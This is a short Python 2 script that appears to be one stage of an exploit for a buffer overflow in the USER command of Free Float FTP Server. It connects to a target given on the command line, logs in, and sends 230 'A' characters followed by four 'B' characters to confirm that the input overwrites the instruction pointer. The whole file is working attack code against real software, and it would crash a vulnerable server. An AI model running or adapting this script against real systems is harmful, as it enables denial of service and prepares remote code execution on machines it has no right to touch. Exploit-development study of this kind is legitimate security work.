#!/usr/bin/python

import socket
import sys

junk = 'A' * 230
eip_override = 'B' * 4

verfication_string = junk + eip_override

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nNow sending the string to FTP server to verify the offset.\n"
soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER someone' + '\r\n')
d = soc.recv(1024)

soc.send('PASS someone' + '\r\n')
d = soc.recv(1024)

soc.send('USER ' + verfication_string + '\r\n') # Free Float FTP Server BO vulnerability exists in the USER command
d = soc.recv(1024)

soc.close()

print "\nDone sending the verification string."
